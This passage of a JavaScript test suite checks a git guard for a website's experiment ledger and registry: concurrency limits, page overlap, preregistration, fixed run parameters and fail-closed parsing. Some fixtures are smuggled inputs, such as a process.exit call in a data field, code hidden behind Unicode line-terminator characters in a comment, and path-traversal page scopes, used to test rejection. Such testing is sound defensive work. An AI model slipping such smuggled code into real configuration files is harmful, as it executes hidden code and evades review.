    expect('bookkeeping and a site change still need a new line', { base: 'main-judged', ledger: false, setup: () => { write(LEDGER, `${HERO}\n${entry('2026-10-02-menu', { status: 'shipped', pr: 59 })}\n`); write('components/Card.tsx', 'export const y = 2;\n'); }, rules: ['ledger'], messages: ['adds no line'] });
    // Deleted lines are reported once, as deletions (as after a plain git revert of the merge).
    expect('an earlier line deleted and a revert entry appended', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${HERO}\n${proposal({ kind: 'revert', evaluate_after: null })}\n`), rules: ['ledger'], messages: ['existing entry "2026-10-02-menu" was removed'], absent: ['adds no line', 'moved from line', '2026-10-01-hero'] });
    expect('the first line deleted', { base: 'main-judged', ledger: false, setup: () => write(LEDGER, `${entry('2026-10-02-menu', { status: 'proposed' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['existing entry "2026-10-01-hero" was removed'], absent: ['adds no line', 'moved from line', '"2026-10-02-menu"'] });
    expect('an empty change still needs a ledger line', { ledger: false, setup: () => {}, rules: ['ledger'] });
    // Experiment concurrency: count the union of active ledger entries and running registry entries.
    {
      const exp = (key, pages, extra = {}) => JSON.parse(entry(`2026-10-01-${key}`, { kind: 'experiment', status: 'shipped', pr: 60, shipped_on: '2026-10-02', min_sample: 150, max_days: 42, experiment: key, pages, ...extra }));
      const reg = (key, pages, extra = {}) => ({ key, pages, status: 'running', ...extra });
      const ledger = (values) => values.map((v) => JSON.stringify(v)).join('\n');
      const registry = (values) => `export const EXPERIMENTS = ${JSON.stringify(values)} as const;`;
      const a = exp('a', ['/']); const b = exp('b', ['/tools']); const c = exp('c', ['/about'], { status: 'proposed' });
      const check = (label, base, head, before, after, expected = [], warned = []) => {
        cases += 1;
        const problems = [];
        const warnings = [];
        try { checkExperiments(ledger(base), ledger(head), before, after, problems, warnings, { today: '2026-10-15' }); }
        catch (error) { failures.push(`experiment ${label}: threw ${error.message}`); return; }
        if ((!expected.length && problems.length) || expected.some((text) => !problems.some((p) => p.message.includes(text)))) failures.push(`experiment ${label}: ${JSON.stringify(problems)}`);
        if (warned.some((text) => !warnings.some((w) => w.message.includes(text)))) failures.push(`experiment ${label}: warnings ${JSON.stringify(warnings)}`);
      };
      check('two separate pages are allowed', [a], [a, b], registry([reg('a', ['/'])]), registry([reg('a', ['/']), reg('b', ['/tools'], { started: '2026-10-02' })]));
      check('a third ledger experiment is refused', [a, b], [a, b, c], registry([]), registry([]), ['3 experiments']);
      check('proposed entries reserve a slot too', [{ ...a, status: 'proposed' }, b], [{ ...a, status: 'proposed' }, b, c], registry([]), registry([]), ['3 experiments']);
      check('a matching ledger and registry key count once', [a], [a, b], registry([reg('a', ['/'])]), registry([reg('a', ['/']), reg('b', ['/tools'], { started: '2026-10-02' })]));
      check('registry-only active experiments count', [], [c], registry([reg('a', ['/']), reg('b', ['/tools'])]), registry([reg('a', ['/']), reg('b', ['/tools'])]), ['3 experiments']);
      check('concluded bookkeeping cannot hide a running registry experiment', [{ ...a, status: 'concluded' }, b], [{ ...a, status: 'concluded' }, b, c], registry([reg('a', ['/'])]), registry([reg('a', ['/'])]), ['3 experiments']);
      check('a concluded and paused experiment frees its slot', [{ ...a, status: 'concluded' }, b], [{ ...a, status: 'concluded' }, b, c], registry([reg('a', ['/'], { status: 'paused' })]), registry([reg('a', ['/'], { status: 'paused' })]));
      check('unmerged historical records do not occupy slots', [{ ...a, status: 'reverted' }, b], [{ ...a, status: 'reverted' }, b, c], registry([]), registry([]));
      check('two experiments on one unknown page area fail', [a], [a, { ...b, pages: ['/'] }], registry([]), registry([]), ['overlap on the same page area']);
      check('one common page in a multi-page scope fails', [a], [a, { ...b, pages: ['/tools', '/'] }], registry([]), registry([]), ['overlap']);
      check('distinct explicit areas on a page are allowed', [{ ...a, area: 'hero' }], [{ ...a, area: 'hero' }, { ...b, pages: ['/'], area: 'footer' }], registry([]), registry([]));
      check('the same explicit area fails', [{ ...a, area: 'hero' }], [{ ...a, area: 'hero' }, { ...b, pages: ['/'], area: 'hero' }], registry([]), registry([]), ['overlap']);
      check('unknown area overlaps a known area', [a], [a, { ...b, pages: ['/'], area: 'hero' }], registry([]), registry([]), ['overlap']);
      check('site-wide scope overlaps any page', [{ ...a, pages: ['*'] }], [{ ...a, pages: ['*'] }, b], registry([]), registry([]), ['overlap']);
      check('registry/ledger scope disagreement fails', [], [a], registry([]), registry([reg('a', ['/tools'])]), ['experiment "a" runs on ["/tools"] but was registered for ["/"]; register a new experiment instead']);
      check('registry/ledger area disagreement fails', [], [{ ...a, area: 'hero' }], registry([]), registry([reg('a', ['/'], { area: 'footer' })]), ['experiment "a" runs on ["/"] area "footer" but was registered for ["/"] area "hero"']);
      // A running key keeps the scope it was registered with, whatever its registration's status now.
      const judged = (value, status) => ({ ...value, status, verdict: status === 'concluded' ? 'keep-control' : 'revert', result: { control: 80, variant: 75 }, evaluated_on: '2026-10-14', notes: 'Judged.' });
      const change = { id: '2026-10-14-change', kind: 'change', status: 'proposed' };
      for (const status of ['concluded', 'reverted']) {
        check(`a running key cannot move pages after its entry is ${status}`, [judged(a, status)], [judged(a, status)], registry([reg('a', ['/'])]), registry([reg('a', ['/tools'])]), ['experiment "a" runs on ["/tools"] but was registered for ["/"]; register a new experiment instead']);
        check(`a running key cannot add pages after its entry is ${status}`, [judged(a, status)], [judged(a, status)], registry([reg('a', ['/'])]), registry([reg('a', ['/', '/tools'])]), ['runs on ["/","/tools"] but was registered for ["/"]']);
        check(`a running key cannot move area after its entry is ${status}`, [judged({ ...a, area: 'hero' }, status)], [judged({ ...a, area: 'hero' }, status)], registry([reg('a', ['/'], { area: 'hero' })]), registry([reg('a', ['/'], { area: 'footer' })]), ['runs on ["/"] area "footer" but was registered for ["/"] area "hero"']);
        check(`a running key that keeps its scope and run passes after its entry is ${status}`, [judged(a, status)], [judged(a, status), change], registry([reg('a', ['/'], { started: '2026-10-02' })]), registry([reg('a', ['/'], { started: '2026-10-02' })]));
        check(`a running key cannot be given a start after its entry is ${status}`, [judged(a, status)], [judged(a, status), change], registry([reg('a', ['/'])]), registry([reg('a', ['/'], { started: '2026-10-02' })]), ['experiment "a" changes "started" from missing to "2026-10-02" while "2026-10-01-a" registers it']);
      }
      check('the latest registration of a key binds it', [{ ...judged(a, 'concluded'), pages: ['/tools'] }, judged(a, 'reverted')], [{ ...judged(a, 'concluded'), pages: ['/tools'] }, judged(a, 'reverted')], registry([reg('a', ['/'])]), registry([reg('a', ['/tools'])]), ['runs on ["/tools"] but was registered for ["/"]']);
      // Only an experiment entry registers a key: other kinds only name it, and a closed-unmerged record never ran.
      const stuck = { ...a, id: '2026-09-20-stuck', status: 'reverted', verdict: 'inconclusive', pr: 70, shipped_on: null, pages: ['/tools'], notes: 'Closed unmerged.' };
      check('a closed-unmerged record of a running key does not register it', [judged(a, 'concluded')], [judged(a, 'concluded'), stuck], registry([reg('a', ['/'])]), registry([reg('a', ['/'])]));
      check('a closed-unmerged record cannot move a running key', [judged(a, 'concluded')], [judged(a, 'concluded'), stuck], registry([reg('a', ['/'])]), registry([reg('a', ['/tools'])]), ['runs on ["/tools"] but was registered for ["/"]']);
      for (const kind of ['change', 'fix']) {
        check(`a ${kind} entry naming a running key cannot move it`, [a], [a, { ...change, kind, experiment: 'a', pages: ['/', '/tools'] }], registry([reg('a', ['/'])]), registry([reg('a', ['/', '/tools'])]), ['runs on ["/","/tools"] but was registered for ["/"]']);
        check(`a ${kind} entry naming a running key without pages passes`, [a], [a, { ...change, kind, experiment: 'a' }], registry([reg('a', ['/'])]), registry([reg('a', ['/'])]));
      }
      check('a fix entry cannot widen a running key to the whole site', [{ ...a, area: 'hero' }], [{ ...a, area: 'hero' }, { ...change, kind: 'fix', experiment: 'a', pages: ['*'], area: '*' }], registry([reg('a', ['/'], { area: 'hero' })]), registry([reg('a', ['*'])]), ['runs on ["*"] but was registered for ["/"] area "hero"']);
      const wide = { ...a, id: '2026-10-14-a-wide', date: '2026-10-14', status: 'proposed', pr: null, shipped_on: null, pages: ['/', '/tools'] };
      // Paused by an earlier pull request: one that also gave the running key its new run would stop and start it at once.
      check('a paused key can run on other pages under a new experiment entry', [judged(a, 'concluded')], [judged(a, 'concluded'), wide], registry([reg('a', ['/'], { status: 'paused' })]), registry([reg('a', ['/tools', '/'], { started: '2026-10-14' })]));
      // A key's run (its start and arms) is set by the pull request that registers its experiment, and then fixed: the
      // readout counts from the start and compares the arms, so a later change would pick them after seeing the data.
      const RUN = { started: '2026-10-02', variants: ['control', 'short-dek'], weights: [50, 50] };
      const running = registry([reg('a', ['/'], RUN)]);
      check('a running key that keeps its run passes beside a new change', [a], [a, change], running, running);
      for (const [label, extra, message] of [
        ['moves its start later', { started: '2026-10-12' }, 'changes "started" from "2026-10-02" to "2026-10-12" while "2026-10-01-a" registers it; a run keeps its start and arms'],
        ['moves its start into the future', { started: '2027-06-01' }, 'changes "started" from "2026-10-02" to "2027-06-01"'],
        ['drops its start', { started: undefined }, 'changes "started" from "2026-10-02" to missing'],
        ['renames an arm', { variants: ['control', 'short-dek-2'] }, 'changes "variants" from ["control","short-dek"] to ["control","short-dek-2"]'],
        ['adds an arm', { variants: ['control', 'short-dek', 'long-dek'], weights: [34, 33, 33] }, 'changes "variants"'],
        ['reweights its arms', { weights: [90, 10] }, 'changes "weights" from [50,50] to [90,10]'],
      ]) {
        check(`a running key that ${label} fails`, [a], [a, change], running, registry([reg('a', ['/'], { ...RUN, ...extra })]), [message]);
        check(`a paused key that ${label} fails`, [a], [a, change], registry([reg('a', ['/'], { ...RUN, status: 'paused' })]), registry([reg('a', ['/'], { ...RUN, ...extra, status: 'paused' })]), [message]);
      }
      check('a running key may be paused', [a], [a, change], running, registry([reg('a', ['/'], { ...RUN, status: 'paused' })]));
      check('a paused key may resume with its run', [a], [a, change], registry([reg('a', ['/'], { ...RUN, status: 'paused' })]), running);
      check('a running key may be removed', [judged(a, 'concluded')], [judged(a, 'concluded'), change], running, registry([]));
      check('a removed key cannot be added again under its old registration', [a], [a, change], registry([]), running, ['experiment "a" is added under "2026-10-01-a", which is already on main']);
      // A pull request stops experiments or starts them, never both: an automatic revert keeps main's registry after a
      // merge that only stopped some (a concluded experiment stays stopped) and reverts it after one that started one (it
      // stops with its code), so it could not undo a merge that did both without restarting a stopped experiment.
      {
        const menuEntry = { ...b, id: '2026-10-14-b', date: '2026-10-14', status: 'proposed', pr: null, shipped_on: null };
        const menuRun = reg('b', ['/tools'], { started: '2026-10-14', variants: ['control', 'grid'], weights: [50, 50] });
        const menuShipped = reg('b', ['/tools'], { started: '2026-10-02', variants: ['control', 'grid'], weights: [50, 50] });
        const paused = (value) => ({ ...value, status: 'paused' });
        const NEXT = 'conclude or pause the running experiment in one pull request and start the new one in the next';
        check('pausing one experiment and starting another in one pull request fails', [a], [judged(a, 'concluded'), menuEntry], running, registry([paused(reg('a', ['/'], RUN)), menuRun]), ['this pull request stops experiment "a" and starts experiment "b"', NEXT]);
        check('removing one experiment and starting another in one pull request fails', [a], [judged(a, 'concluded'), menuEntry], running, registry([menuRun]), ['this pull request stops experiment "a" and starts experiment "b"', NEXT]);
        check('pausing one experiment and resuming another in one pull request fails', [a, b], [judged(a, 'concluded'), b], registry([reg('a', ['/'], RUN), paused(menuShipped)]), registry([paused(reg('a', ['/'], RUN)), menuShipped]), ['this pull request stops experiment "a" and starts experiment "b"', NEXT]);
        // A new registration dated on or before the running key's start keeps the start; new pages or area alone are its new run.
        const sameDay = { ...wide, id: '2026-10-02-a-wide', date: '2026-10-02' };
        check('moving a running key to other pages under a new registration with its run unchanged fails', [a], [judged(a, 'concluded'), sameDay], running, registry([reg('a', ['/', '/tools'], RUN)]), ['this pull request stops experiment "a" and starts experiment "a" (a running key given other pages, another area or a new run counts as both)', NEXT]);
        check('moving a running key to another area under a new registration with its run unchanged fails', [a], [judged(a, 'concluded'), { ...sameDay, pages: ['/'], area: 'hero' }], running, registry([reg('a', ['/'], { ...RUN, area: 'hero' })]), ['this pull request stops experiment "a" and starts experiment "a" (a running key given other pages, another area or a new run counts as both)', NEXT]);
        check('giving a running key a new run under a new registration in one pull request fails', [judged(a, 'concluded')], [judged(a, 'concluded'), wide], running, registry([reg('a', ['/', '/tools'], { ...RUN, started: '2026-10-14', variants: ['control', 'wide'] })]), ['this pull request stops experiment "a" and starts experiment "a"', 'a running key given other pages, another area or a new run counts as both', NEXT]);
        check('stopping two experiments in one pull request passes', [a, b], [judged(a, 'concluded'), judged(b, 'concluded')], registry([reg('a', ['/'], RUN), menuShipped]), registry([paused(reg('a', ['/'], RUN))]));
        check('starting an experiment beside a running one passes', [a], [a, menuEntry], running, registry([reg('a', ['/'], RUN), menuRun]));
        check('pausing one of two running experiments and changing nothing else passes', [a, b], [judged(a, 'concluded'), b], registry([reg('a', ['/'], RUN), menuShipped]), registry([paused(reg('a', ['/'], RUN)), menuShipped]));
      }
      // A new registration sets a new run: from its date, and not in the future (of a key an earlier pull request paused).
      const pausedRun = registry([reg('a', ['/'], { ...RUN, status: 'paused' })]);
      for (const started of ['2026-10-14', '2026-10-16']) check(`a new registration's run may start on ${started}`, [judged(a, 'concluded')], [judged(a, 'concluded'), wide], pausedRun, registry([reg('a', ['/', '/tools'], { ...RUN, started, variants: ['control', 'wide'] })]));
      for (const started of ['2026-10-13', '2026-10-17', '2026-13-01', 20261015]) {
        check(`a new registration's run cannot start on ${started}`, [judged(a, 'concluded')], [judged(a, 'concluded'), wide], pausedRun, registry([reg('a', ['/', '/tools'], { ...RUN, started })]), [`experiment "a" starts on ${JSON.stringify(started)}; a run registered by "2026-10-14-a-wide" starts on or after its date 2026-10-14 and not after today (2026-10-15`]);
      }
      check('a new experiment\'s run cannot start before it is registered', [], [{ ...a, id: '2026-10-14-a', date: '2026-10-14', status: 'proposed', pr: null, shipped_on: null }], registry([]), registry([reg('a', ['/'], { started: '2026-10-01' })]), ['experiment "a" starts on "2026-10-01"']);
      // The framework (lib/experiment-runtime.ts) refuses a registry entry without a start, so a new run names one.
      check('a new experiment must name its start', [], [{ ...a, id: '2026-10-14-a', date: '2026-10-14', status: 'proposed', pr: null, shipped_on: null }], registry([]), registry([reg('a', ['/'])]), ['experiment "a" has no "started"; a run registered by "2026-10-14-a" starts on or after its date 2026-10-14 and not after today']);
      check('a new experiment paused from the start must name its start too', [], [{ ...a, id: '2026-10-14-a', date: '2026-10-14', status: 'proposed', pr: null, shipped_on: null }], registry([]), registry([reg('a', ['/'], { status: 'paused' })]), ['experiment "a" has no "started"']);
      check('a new experiment that starts on its date passes', [], [{ ...a, id: '2026-10-14-a', date: '2026-10-14', status: 'proposed', pr: null, shipped_on: null }], registry([]), registry([reg('a', ['/'], { started: '2026-10-14' })]));
      // A line already on main, even one that does not parse, is on main: repaired into an experiment entry, it does not
      // register a new run, so the key keeps the run main has.
      {
        const brokenAfter = `${ledger([a])}\n{"id": "2026-10-05-broken", oops\n`;
        const again = { ...a, id: '2026-10-01-a-again', status: 'concluded', verdict: 'keep-control', result: { control: 80, variant: 75 }, evaluated_on: '2026-10-14' };
        const repairedCase = (label, after, expected) => {
          cases += 1;
          const problems = [];
          try { checkExperiments(brokenAfter, `${ledger([a, again])}\n`, running, after, problems, [], { today: '2026-10-15' }); } catch (error) { failures.push(`experiment ${label}: threw ${error.message}`); return; }
          if ((!expected.length && problems.length) || expected.some((text) => !problems.some((p) => p.message.includes(text)))) failures.push(`experiment ${label}: ${JSON.stringify(problems)}`);
        };
        repairedCase('a repaired line keeps a running key on the run main has', running, []);
        repairedCase('a repaired line cannot reweight a running key', registry([reg('a', ['/'], { ...RUN, weights: [90, 10] })]), ['changes "weights" from [50,50] to [90,10] while "2026-10-01-a-again" registers it']);
      }
      check('a running key with no registration cannot change scope', [], [change], registry([reg('a', ['/'])]), registry([reg('a', ['/tools'])]), ['experiment "a" runs on ["/tools"] but no experiment ledger entry registers it']);
      check('a running key with no registration already on the base only warns', [], [change], registry([reg('a', ['/'])]), registry([reg('a', ['/'])]), [], ['no experiment ledger entry registers it; register a new experiment instead (already on the base)']);
      check('a scope mismatch already on the base only warns', [judged(a, 'concluded')], [judged(a, 'concluded'), change], registry([reg('a', ['/tools'])]), registry([reg('a', ['/tools'])]), [], ['experiment "a" runs on ["/tools"] but was registered for ["/"]; register a new experiment instead (already on the base)']);
      check('a registry change elsewhere does not turn a mismatch on the base into a failure', [judged(a, 'concluded')], [judged(a, 'concluded')], registry([reg('a', ['/tools'])]), registry([reg('a', ['/tools']), { key: 'old', status: 'paused' }]), [], ['already on the base']);
      check('a mismatch on the base cannot be changed into another one', [judged(a, 'concluded')], [judged(a, 'concluded')], registry([reg('a', ['/tools'])]), registry([reg('a', ['/about'])]), ['runs on ["/about"] but was registered for ["/"]']);
      check('a paused key needs no matching registration', [judged(a, 'concluded')], [judged(a, 'concluded')], registry([reg('a', ['/'])]), registry([reg('a', ['/tools'], { status: 'paused' })]));
      check('registry activation cannot bypass experiment preregistration', [], [], registry([]), registry([reg('a', ['/'])]), ['needs a valid active, pre-registered']);
      check('a paused registry experiment cannot be resumed without preregistration', [], [], registry([reg('a', ['/'], { status: 'paused' })]), registry([reg('a', ['/'])]), ['needs a valid active, pre-registered']);
      check('an invalid historical pre-registration cannot be activated', [{ ...a, min_sample: undefined }], [{ ...a, min_sample: undefined }], registry([]), registry([reg('a', ['/'])]), ['needs a valid active, pre-registered']);
      check('duplicate active ledger keys are refused', [a], [a, { ...b, experiment: 'a' }], registry([]), registry([]), ['more than one active ledger entry']);
      check('duplicate registry keys are refused', [], [a], registry([]), registry([reg('a', ['/']), reg('a', ['/'])]), ['unique keys']);
      check('unknown registry status is refused', [], [a], registry([]), registry([reg('a', ['/'], { status: 'runing' })]), ['status "running" or "paused"']);
      check('missing registry blocks new experiments', [], [a], null, null, ['registry exists']);
      check('removing the registry is refused even without a new experiment', [], [], registry([]), null, ['registry cannot be removed']);
      check('ordinary changes do not need a registry', [], [{ id: '2026-10-14-change', kind: 'change', status: 'proposed' }], null, null);
      check('unknown historical scope blocks new experiments', [{ ...a, pages: undefined }], [{ ...a, pages: undefined }, b], registry([]), registry([]), ['canonical "pages"']);
      check('missing registry key blocks new experiments', [], [{ ...a, experiment: undefined }], registry([]), registry([]), ['requires its registry "experiment" key']);
      for (const pages of [undefined, [], ['/','/'], ['/tools/'], ['/tools/../'], ['https://example.com'], ['/%2f'], ['/?q=name']]) check(`invalid scope ${JSON.stringify(pages)} is refused`, [], [{ ...a, pages }], registry([]), registry([]), ['canonical "pages"']);
      for (const area of ['', null, 1, 'hero footer']) check(`invalid area ${JSON.stringify(area)} is refused`, [], [{ ...a, area }], registry([]), registry([]), ['"area" must be']);
      for (const source of [
        'export const EXPERIMENTS = loadExperiments();',
        'export const EXPERIMENTS = [...other];',
        'export const EXPERIMENTS = []; EXPERIMENTS.push({key:"a"});',
        'const hidden = "export const EXPERIMENTS = []";',
        'export const EXPERIMENTS = []; export const OTHER = [];',
        'export const EXPERIMENTS = [{key:"a",key:"b",status:"running",pages:["/"]}];',
        'export const EXPERIMENTS = [{key:"a",status: process.exit(99),pages:["/"]}];',
      ]) check('uninspectable or executable registry fails closed', [], [a], registry([]), source, ['cannot establish experiment occupancy']);
      for (const terminator of ['\r', '\u2028', '\u2029']) check('code after a JavaScript line-comment terminator is rejected', [], [a], registry([]), `export const EXPERIMENTS = []; // comment${terminator}EXPERIMENTS.push({key:'hidden',status:'running',pages:['/']});`, ['cannot establish experiment occupancy']);
      check('literal TypeScript registry supports comments, single quotes, and trailing commas', [], [a], registry([]), "/* data */ export const EXPERIMENTS = [{key:'a',status:'running',pages:['/'],started:'2026-10-02',},] as const; // done\n");
      check('paused entries need no active scope', [], [a], registry([]), registry([{ key: 'old', status: 'paused' }, reg('a', ['/'], { started: '2026-10-02' })]));
      check('null registry entry is refused', [], [a], registry([]), registry([null]), ['unique keys']);
      check('malformed baseline registry fails closed', [], [a], 'not a registry', registry([reg('a', ['/'])]), ['cannot establish experiment occupancy']);
      cases += 1;
      const malformed = [];
      checkExperiments('', '{broken\n' + ledger([a]), registry([]), registry([]), malformed);
      if (!malformed.some((p) => p.message.includes('invalid ledger line'))) failures.push('experiment malformed ledger did not fail closed');
      for (const alias of ['lib/experiments.tsx', 'lib/experiments.mts', 'lib/experiments.cts', 'lib/experiments/index.ts', 'lib/experiments']) {
        expect(`registry alias ${alias} cannot bypass inspection`, { setup: () => write(alias, registry([reg('a', ['/']), reg('b', ['/']), reg('c', ['/'])])), rules: ['protected-path'], messages: ['registry aliases are protected'] });
      }
      expect('renaming the registry cannot bypass inspection', { setup: () => { remove(EXPERIMENT_REGISTRY); write('lib/experiments.tsx', registry([reg('a', ['/']), reg('b', ['/']), reg('c', ['/'])])); }, rules: ['protected-path', 'experiment'], messages: ['registry aliases are protected', 'registry cannot be removed'] });
      expect('experiment concurrency is wired into the git guard', { ledger: false, setup: () => { write(LEDGER, `${BASE_LEDGER}${proposal(EXPERIMENT)}\n`); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/']), reg('unregistered', ['/tools'])])); }, rules: ['experiment'], messages: ['needs a valid active, pre-registered'] });
      expect('new experiment without a registry is refused by the git guard', { ledger: false, setup: () => { write(LEDGER, `${BASE_LEDGER}${proposal(EXPERIMENT)}\n`); remove(EXPERIMENT_REGISTRY); }, rules: ['experiment'], messages: ['registry cannot be removed'] });
      // A running key's registration is checked through the git guard too; a mismatch already on main never blocks.
      const concludedHero = entry('2026-10-01-hero', { ...EXPERIMENT, status: 'concluded', pr: 58, shipped_on: '2026-10-02', verdict: 'keep-control', result: { control: 80, variant: 75 }, evaluated_on: '2026-10-14' });
      const runningBase = (label, pages, line = concludedHero, runFields = {}) => { run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', label); write(LEDGER, `${BASE_LEDGER}${line}\n`); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', pages, runFields)])); run('add', '-A'); run('commit', '-q', '-m', label); return label; };
      const heroRunning = runningBase('base-hero-running', ['/']);
      expect('a running key cannot move pages after its experiment concluded', { base: heroRunning, setup: () => write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/tools'])])), rules: ['experiment'], messages: ['lib/experiments.ts:null experiment "home-hero" runs on ["/tools"] but was registered for ["/"]; register a new experiment instead'] });
      expect('a running key that keeps its scope does not block a site change', { base: heroRunning, setup: () => write('components/Card.tsx', 'export const y = 2;\n') });
      const heroMismatch = runningBase('base-hero-mismatch', ['/tools']);
      expect('a scope mismatch already on main is a warning for a site change', { base: heroMismatch, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), warned: ['runs on ["/tools"] but was registered for ["/"]; register a new experiment instead (already on the base)'] });
      expect('a scope mismatch already on main does not block a pull request that changes neither the registry nor the ledger', { base: heroMismatch, ledger: false, setup: () => write('autopilot/backlog.md', '# Backlog\n- Re-ranked.\n'), warned: ['already on the base'] });
      // Only an experiment entry that ran or is being registered binds the key (skill step 1.3 records a closed v2).
      const wider = (id, extra = {}) => entry(id, { ...EXPERIMENT, pages: ['/', '/tools'], status: 'reverted', verdict: 'inconclusive', notes: 'Closed unmerged after 7 days.', ...extra });
      expect('a closed-unmerged record of a running key passes in a bookkeeping pull request', { base: heroRunning, branch: 'autopilot/2026-10-15-bookkeeping', ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${wider('2026-10-10-hero-wide', { pr: 70 })}\n`) });
      expect('a closed-unmerged record cannot widen a running key', { base: heroRunning, setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${wider('2026-09-20-old', { pr: 55 })}\n`); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/', '/tools'])])); }, rules: ['experiment'], messages: ['runs on ["/","/tools"] but was registered for ["/"]'] });
      // Nor can one already on main, by being given the ship day its record reached main (a bookkeeping merge, no merge of its own).
      const heroWithRecord = runningBase('base-hero-record', ['/'], `${concludedHero}\n${wider('2026-10-06-hero-wide', { pr: 70 })}`);
      expect('a closed-unmerged record on main cannot be given a ship day to widen a running key', { base: heroWithRecord, ledger: false, setup: () => { write(LEDGER, `${BASE_LEDGER}${concludedHero}\n${wider('2026-10-06-hero-wide', { pr: 70, shipped_on: '2026-10-15' })}\n${proposal()}\n`); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/', '/tools'])])); }, rules: ['experiment', 'ledger'], messages: ['keeps "shipped_on" null'] });
      const heroShipped = runningBase('base-hero-shipped', ['/'], entry('2026-10-01-hero', { ...EXPERIMENT, status: 'shipped', pr: 58, shipped_on: '2026-10-02' }));
      expect('a change entry naming a running key cannot widen it', { base: heroShipped, ledger: false, setup: () => { fs.appendFileSync(path.join(dir, LEDGER), `${proposal({ experiment: 'home-hero', pages: ['/', '/tools'] })}\n`); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/', '/tools'])])); }, rules: ['experiment'], messages: ['runs on ["/","/tools"] but was registered for ["/"]'] });
      // A running experiment's start and arms are checked through the git guard too, on any pull request.
      const heroRun = runningBase('base-hero-run', ['/'], entry('2026-10-01-hero', { ...EXPERIMENT, status: 'shipped', pr: 58, shipped_on: '2026-10-02' }), { started: '2026-10-02', variants: ['control', 'short-dek'] });
      expect('a site change beside a running experiment that keeps its run passes', { base: heroRun, setup: () => write('components/Card.tsx', 'export const y = 2;\n') });
      expect('a site change cannot move a running experiment\'s start', { base: heroRun, setup: () => { write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/'], { started: '2026-10-12', variants: ['control', 'short-dek'] })])); write('components/Card.tsx', 'export const y = 2;\n'); }, rules: ['experiment'], messages: ['experiment "home-hero" changes "started" from "2026-10-02" to "2026-10-12" while "2026-10-01-hero" registers it'] });
      // A new registration may be dated two days before its branch, so it can keep a start that falls on its date; its
      // new pages alone are still a new run, which stops the concluded one and starts another in one pull request.
      const LATE_RUN = { started: '2026-10-13', variants: ['control', 'short-dek'] };
      const heroLate = runningBase('base-hero-late', ['/'], entry('2026-10-01-hero', { ...EXPERIMENT, status: 'shipped', pr: 58, shipped_on: '2026-10-02' }), LATE_RUN);
      expect('a new registration cannot keep a running key\'s run on other pages', { base: heroLate, branch: 'autopilot/2026-10-15-hero-wide', ledger: false, setup: () => { write(LEDGER, `${BASE_LEDGER}${concludedHero}\n${entry('2026-10-15-hero-wide', { ...EXPERIMENT, date: '2026-10-13', pages: ['/', '/tools'] })}\n`); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/', '/tools'], LATE_RUN)])); }, rules: ['experiment'], messages: ['this pull request stops experiment "home-hero" and starts experiment "home-hero"'] });
      // Reverting the pull request that concluded an experiment (the skill's §5.6) keeps the key as main has it: a
      // concluded experiment never runs again, and the guard says so when a revert would restart or re-add it.
      const conclusion = (extra = {}) => entry('2026-10-12-hero-conclusion', { kind: 'conclude', evaluate_after: null, experiment: 'home-hero', ...extra });
      const RUN_HERO = { started: '2026-10-02', variants: ['control', 'short-dek'] };
      const concludedBase = (label, registered) => { run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', label); write(LEDGER, `${BASE_LEDGER}${concludedHero}\n${conclusion({ status: 'shipped', pr: 71, shipped_on: '2026-10-15' })}\n`); write(EXPERIMENT_REGISTRY, registry(registered)); run('add', '-A'); run('commit', '-q', '-m', label); return label; };
      const undoConclusion = () => fs.writeFileSync(path.join(dir, LEDGER), `${BASE_LEDGER}${concludedHero}\n${conclusion({ status: 'reverted', pr: 71, shipped_on: '2026-10-15', verdict: 'revert', evaluated_on: '2026-10-15', notes: 'The new default broke old phones; reverted in #72.' })}\n${entry('2026-10-15-revert-hero', { kind: 'revert', evaluate_after: null })}\n`);
      const revertBranch = 'autopilot/2026-10-15-revert-hero';
      const pausedBase = concludedBase('base-hero-concluded-paused', [reg('home-hero', ['/'], { ...RUN_HERO, status: 'paused' })]);
      expect('a revert of a conclusion keeps its paused key paused', { base: pausedBase, branch: revertBranch, ledger: false, setup: () => { undoConclusion(); write('components/Card.tsx', 'export const y = 2;\n'); } });
      expect('a revert of a conclusion cannot restart its key', { base: pausedBase, branch: revertBranch, ledger: false, setup: () => { undoConclusion(); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/'], RUN_HERO)])); }, rules: ['experiment'], messages: ['newly running registry experiment "home-hero" needs a valid active, pre-registered experiment ledger entry; a concluded or reverted experiment never runs again (a revert keeps lib/experiments.ts as main has it)'] });
      const removedBase = concludedBase('base-hero-concluded-removed', []);
      expect('a revert of a conclusion keeps its removed key removed', { base: removedBase, branch: revertBranch, ledger: false, setup: () => { undoConclusion(); write('components/Card.tsx', 'export const y = 2;\n'); } });
      expect('a revert of a conclusion cannot add its key back', { base: removedBase, branch: revertBranch, ledger: false, setup: () => { undoConclusion(); write(EXPERIMENT_REGISTRY, registry([reg('home-hero', ['/'], { ...RUN_HERO, status: 'paused' })])); }, rules: ['experiment'], messages: ['experiment "home-hero" is added under "2026-10-01-hero", which is already on main', 'keep it removed (a revert keeps lib/experiments.ts as main has it)'] });
    }

    // Ledger: a base that is already untidy does not block every later pull request. A base made here is committed
    // on `at`: the day its lines reached main, which is the day a line it adds ships (shipped_on, once set).
    const untidyBase = (label, text, at = COMMIT_DATE) => { run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', label); write(LEDGER, text); run('add', '-A'); runAt(at, 'commit', '-q', '-m', label); return label; };
    const MERGED_OCT_3 = '2026-10-03T16:00:00+00:00';
    expect('a trailing blank line on the base', { base: untidyBase('base-blank', `${BASE_LEDGER}\n`), ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`) });
    expect('a blank line on the base replaced by the new entry', { base: 'base-blank', ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${proposal()}\n`) });
